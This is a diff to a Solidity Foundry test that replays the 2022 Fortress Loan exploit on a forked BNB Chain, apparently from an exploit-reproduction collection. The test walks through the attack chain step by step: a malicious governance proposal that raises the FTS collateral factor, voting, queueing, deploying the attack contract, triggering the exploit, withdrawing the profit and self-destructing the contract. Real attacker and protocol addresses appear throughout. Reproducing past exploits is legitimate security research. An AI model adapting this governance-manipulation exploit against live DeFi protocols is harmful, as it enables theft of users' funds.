@@ -2,7 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "../interface.sol";
+import {IERC20, IPriceFeed, IPancakeRouter, IUnitroller, IVyper} from "../interface.sol";
 
 /* @KeyInfo -- Total Lost : 1,048 ETH + 400,000 DAI (~3,000,000 US$)
     Attacker Wallet : https://bscscan.com/address/0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad
@@ -26,7 +26,6 @@ import "../interface.sol";
     Learnblockchain.cn Analysis :  https://learnblockchain.cn/article/4062
 */
 
-CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 address constant attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
 address constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;
 address constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
@@ -42,13 +41,88 @@ address constant ARTHUSD = 0x88fd584dF3f97c64843CD474bDC6F78e398394f4;
 address constant Vyper1 = 0x98245Bfbef4e3059535232D68821a58abB265C45;
 address constant Vyper2 = 0x1d4B4796853aEDA5Ab457644a18B703b6bA8b4aB;
 address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
+
+interface IGovernorAlpha {
+    function propose(
+        address[] memory targets,
+        uint[] memory values,
+        string[] memory signatures,
+        bytes[] memory calldatas,
+        string memory description
+    ) external returns (uint);
+
+    function castVote(uint256 proposalId, bool support) external;
+
+    function queue(uint256 proposalId) external;
+
+    function execute(uint256 proposalId) external payable;
+
+    function state(uint256 proposalId) external view;
+
+    function proposalThreshold() external view returns (uint);
+}
+
+interface IChain {
+    function submit(
+        uint32 _dataTimestamp,
+        bytes32 _root,
+        bytes32[] memory _keys,
+        uint256[] memory _values,
+        uint8[] memory _v,
+        bytes32[] memory _r,
+        bytes32[] memory _s
+    ) external;
+}
+
+interface FToken {}
+
+interface IFortressPriceOracle {
+    function getUnderlyingPrice(FToken fToken) external view returns (uint256);
+}
+
+interface IFTS {
+    function approve(address spender, uint256 rawAmount) external returns (bool);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function delegate(address delegatee) external;
+
+    function getPriorVotes(address account, uint blockNumber) external view returns (uint96);
+}
+
+interface IfFTS {
+    function mint(uint256 mintAmount) external returns (uint256);
+
+    function balanceOf(address owner) external view returns (uint256);
+}
+
+interface IFBep20Delegator {
+    function getCash() external view returns (uint256);
+
+    function borrow(uint256 borrowAmount) external returns (uint256);
+
+    function underlying() external returns (address);
+}
+
+interface IBorrowerOperations {
+    function openTrove(
+        uint256 _maxFee,
+        uint256 _LUSDAmount,
+        uint256 _ETHAmount,
+        address _upperHint,
+        address _lowerHint,
+        address _frontEndTag
+    ) external;
+}
 
 contract ProposalCreateFactory is Test {
     /* Method 0xb9470ff4 */
     // 創建提案, 提案內容為: 設置 fToken 的抵押係數從 0 變更為 700000000000000000 (0.7 ether)
     function ProposalCreated() public {
         address[] memory _target = new address[](1);
-        uint256[] memory _value = new uint[](1);
+        uint[] memory _value = new uint[](1);
         string[] memory _signature = new string[](1);
         bytes[] memory _calldata = new bytes[](1);
 
@@ -57,6 +131,7 @@ contract ProposalCreateFactory is Test {
         _signature[0] = "_setCollateralFactor(address,uint256)";
         _calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000);
 
+        vm.prank(attacker);
         IGovernorAlpha(GovernorAlpha).propose(
             _target,
             _value,
@@ -224,9 +299,6 @@ contract Attack is Test {
             IFBep20Delegator(fshib)
         ];
 
-        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-        address USDT = 0x55d398326f99059fF775485246999027B3197955;
-
         // Swap each underlyAsset to attacker, Path: Asset->WBNB->USDT
         for (uint256 i = 0; i < 13; i++) {
             if (address(Delegators[i]) == 0xE24146585E882B6b59ca9bFaaaFfED201E4E5491) continue; // Skip Fortress BNB  (fBNB), use singleHop swap later
@@ -278,150 +350,141 @@ contract Attack is Test {
 contract Hacker is Test {
     using stdStorage for StdStorage;
 
-    address USDT = 0x55d398326f99059fF775485246999027B3197955;
-
     constructor() {
-        cheat.createSelectFork("bsc", 17_490_837); // Fork BSC mainnet at block 17490837
-        emit log_string(
-            "This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost"
-        );
-        emit log_named_decimal_uint(
-            "[Start] Attacker Wallet USDT Balance",
-            IERC20(USDT).balanceOf(address(this)),
-            18
-        );
-        cheat.label(attacker, "AttackerWallet");
-        cheat.label(address(this), "AttackContract");
-        cheat.label(USDT, "USDT");
-        cheat.label(MAHA, "MahaDAOProxy");
-        cheat.label(FTS, "FTS");
-        cheat.label(fFTS, "fFTS");
-        cheat.label(GovernorAlpha, "GovernorAlpha");
-        cheat.label(ChainContract, "Chain");
-        cheat.label(FortressPriceOracle, "FortressPriceOracle");
-        cheat.label(PriceFeed, "PriceFeed");
-        cheat.label(Unitroller, "Unitroller");
-        cheat.label(BorrowerOperations, "BorrowerOperations");
-        cheat.label(ARTH, "ARTH");
-        cheat.label(ARTHUSD, "ARTHUSD");
-        cheat.label(Vyper1, "Vyper1");
-        cheat.label(Vyper2, "Vyper2");
-        cheat.label(PancakeRouter, "PancakeRouter");
+        vm.createSelectFork("bsc", 17_490_837); // Fork BSC mainnet at block 17490837
+        emit log_string("This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost");
+        emit log_named_decimal_uint("[Start] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
+        vm.label(attacker, "AttackerWallet");
+        vm.label(address(this), "AttackContract");
+        vm.label(USDT, "USDT");
+        vm.label(MAHA, "MahaDAOProxy");
+        vm.label(FTS, "FTS");
+        vm.label(fFTS, "fFTS");
+        vm.label(GovernorAlpha, "GovernorAlpha");
+        vm.label(ChainContract, "Chain");
+        vm.label(FortressPriceOracle, "FortressPriceOracle");
+        vm.label(PriceFeed, "PriceFeed");
+        vm.label(Unitroller, "Unitroller");
+        vm.label(BorrowerOperations, "BorrowerOperations");
+        vm.label(ARTH, "ARTH");
+        vm.label(ARTHUSD, "ARTHUSD");
+        vm.label(Vyper1, "Vyper1");
+        vm.label(Vyper2, "Vyper2");
+        vm.label(PancakeRouter, "PancakeRouter");
     }
 
     function testExploit() public {
         // txId : 0x18dc1cafb1ca20989168f6b8a087f3cfe3356d9a1edd8f9d34b3809985203501
         // Do : Attacker Create [ProposalCreater] Contract
-        cheat.rollFork(17_490_837); // make sure start from block 17490837
-        cheat.startPrank(attacker); // Set msg.sender = attacker
+        vm.rollFork(17_490_837); // make sure start from block 17490837
+        vm.startPrank(attacker); // Set msg.sender = attacker
         ProposalCreateFactory PCreater = new ProposalCreateFactory();
-        cheat.stopPrank();
-        cheat.label(address(PCreater), "ProposalCreateFactory");
-        emit log_named_address(
-            "[Pass] Attacker created [ProposalCreater] contract",
-            address(PCreater)
-        );
+        vm.stopPrank();
+        vm.label(address(PCreater), "ProposalCreateFactory");
+        emit log_named_address("[Pass] Attacker created [ProposalCreater] contract", address(PCreater));
 
         // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002
         // Do : Create Proposal Id 11
-        cheat.createSelectFork("bsc", 17_490_882);
-        cheat.startPrank(attacker);
-        PCreater.ProposalCreated();
-        cheat.stopPrank();
+        vm.createSelectFork("bsc", 17_490_882);
+
+        address[] memory _target = new address[](1);
+        uint[] memory _value = new uint[](1);
+        string[] memory _signature = new string[](1);
+        bytes[] memory _calldata = new bytes[](1);
+
+        _target[0] = Unitroller;
+        _value[0] = 0;
+        _signature[0] = "_setCollateralFactor(address,uint256)";
+        _calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000);
+
+        vm.prank(address(PCreater));
+        IGovernorAlpha(GovernorAlpha).propose(
+            _target,
+            _value,
+            _signature,
+            _calldata,
+            "Add the FTS token as collateral."
+        );
         emit log_string("[Pass] Attacker created Proposal Id 11");
 
         // txId : 0x83a4f8f52b8f9e6ff1dd76546a772475824d9aa5b953808dbc34d1f39250f29d
         // Do : Vote Proposal Id 11
-        cheat.createSelectFork("bsc", 17_570_125);
-        cheat.startPrank(0x58f96A6D9ECF0a7c3ACaD2f4581f7c4e42074e70); // Malicious voter
+        vm.createSelectFork("bsc", 17_570_125);
+        vm.prank(0x58f96A6D9ECF0a7c3ACaD2f4581f7c4e42074e70); // Malicious voter
         IGovernorAlpha(GovernorAlpha).castVote(11, true);
-        cheat.stopPrank();
         emit log_string("[Pass] Unknown malicious voter supported Proposal 11");
 
         // txId : 0xc368afb2afc499e7ebb575ba3e717497385ef962b1f1922561bcb13f85336252
         // Do : Vote Proposal Id 11
-        cheat.createSelectFork("bsc", 17_570_164);
-        cheat.startPrank(attacker);
-        PCreater.castVote();
-        cheat.stopPrank();
+        vm.createSelectFork("bsc", 17_570_164);
+        vm.prank(attacker);
+        IGovernorAlpha(GovernorAlpha).castVote(11, true);
         emit log_string("[Pass] Attacker supported Proposal 11");
 
         // txId : 0x647c6e89cd1239381dd49a43ca2f29a9fdeb6401d4e268aff1c18b86a7e932a0
         // Do : Queue Proposal Id 11
-        cheat.createSelectFork("bsc", 17_577_532);
-        cheat.startPrank(attacker);
+        vm.createSelectFork("bsc", 17_577_532);
+        vm.prank(attacker);
         IGovernorAlpha(GovernorAlpha).queue(11);
-        cheat.stopPrank();
         emit log_string("[Pass] Attacker queued Proposal 11");
 
         // txId : 0x4800928c95db2fc877f8ba3e5a41e208231dc97812b0174e75e26cca38af5039
         // Do : Create Attack Contract
-        cheat.createSelectFork("bsc", 17_634_589);
-        cheat.setNonce(attacker, 69);
-        cheat.startPrank(attacker);
+        vm.createSelectFork("bsc", 17_634_589);
+        vm.setNonce(attacker, 69);
+        vm.startPrank(attacker);
         Attack attackContract = new Attack();
-        cheat.stopPrank();
-        cheat.label(address(attackContract), "AttackContract");
+        vm.stopPrank();
+        vm.label(address(attackContract), "AttackContract");
         assert(address(attackContract) == 0xcD337b920678cF35143322Ab31ab8977C3463a45); // make sure deployAddr is same as mainnet
-        emit log_named_address(
-            "[Pass] Attacker created [AttackContract] contract",
-            address(attackContract)
-        );
+        emit log_named_address("[Pass] Attacker created [AttackContract] contract", address(attackContract));
 
         // txId : 0x6a04f47f839d6db81ba06b17b5abbc8b250b4c62e81f4a64aa6b04c0568dc501
         // Do : Send 3.0203 MahaDAO to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
-        stdstore
-            .target(MAHA)
-            .sig(IERC20(MAHA).balanceOf.selector)
-            .with_key(address(attackContract))
-            .checked_write(3_020_309_536_199_074_866);
+        stdstore.target(MAHA).sig(IERC20(MAHA).balanceOf.selector).with_key(address(attackContract)).checked_write(
+            3_020_309_536_199_074_866
+        );
         assert(IERC20(MAHA).balanceOf(address(attackContract)) == 3_020_309_536_199_074_866);
         emit log_string("[Pass] Attacker send 3.0203 MahaDAO to [AttackContract] contract");
 
         // txId : 0xd127c438bdac59e448810b812ffc8910bbefc3ebf280817bd2ed1e57705588a0
         // Do : Send 100 FTS to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
-        stdstore
-            .target(FTS)
-            .sig(IFTS(FTS).balanceOf.selector)
-            .with_key(address(attackContract))
-            .checked_write(100 ether);
+        stdstore.target(FTS).sig(IFTS(FTS).balanceOf.selector).with_key(address(attackContract)).checked_write(
+            100 ether
+        );
         assert(IFTS(FTS).balanceOf(address(attackContract)) == 100 ether);
         emit log_string("[Pass] Attacker send 100 FTS to [AttackContract] contract");
 
         // txId : 0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf
         // Do : Execute Proposal Id 11
-        cheat.roll(17_634_663); // No fork here, otherwise will get Error("do not spam") in Chain.sol
-        cheat.warp(1_652_042_082); // 2022-05-08 20:34:42 UTC+0
-        cheat.startPrank(attacker);
+        vm.roll(17_634_663); // No fork here, otherwise will get Error("do not spam") in Chain.sol
+        vm.warp(1_652_042_082); // 2022-05-08 20:34:42 UTC+0
+        vm.startPrank(attacker);
         attackContract.exploit();
-        cheat.stopPrank();
+        vm.stopPrank();
         emit log_string("[Pass] Attacker triggered the exploit");
 
         // txId : 0x851a65865ec89e64f0000ab973a92c3313ea09e80eb4b4660195a14d254cd425
         // Do : Withdraw All
-        cheat.roll(17_634_670); // We need to verify the reproduce run as expected, so don't use createSelectFork()
-        cheat.warp(1_651_998_903); // 2022-05-08 20:35:03 UTC+0
-        cheat.startPrank(attacker);
+        vm.roll(17_634_670); // We need to verify the reproduce run as expected, so don't use createSelectFork()
+        vm.warp(1_651_998_903); // 2022-05-08 20:35:03 UTC+0
+        vm.startPrank(attacker);
         attackContract.withdrawAll();
-        cheat.stopPrank();
+        vm.stopPrank();
         emit log_string("[Pass] Attacker successfully withdrew the profit");
 
         // txId : 0xde8d9d55a5c795b2b9b3cd5b648a29b392572719fbabd91993efcd2bc57110d3
         // Do : Destruct the Attack Contract
-        cheat.roll(17_635_247);
-        cheat.warp(1_652_043_834); // 2022-05-08 21:03:54 UTC+0
-        cheat.startPrank(attacker);
+        vm.roll(17_635_247);
+        vm.warp(1_652_043_834); // 2022-05-08 21:03:54 UTC+0
+        vm.startPrank(attacker);
         attackContract.kill();
-        cheat.stopPrank();
+        vm.stopPrank();
         emit log_string("[Pass] Attacker destruct the Attack Contract");
 
-        emit log_named_decimal_uint(
-            "[End] Attacker Wallet USDT Balance",
-            IERC20(USDT).balanceOf(attacker),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(attacker), 18);
 
         // You shold see attacker profit about 300K USDT
         // The USDT were moved after swapping across the cBridge(Celer Network), and swapped them into ETH and DAI.
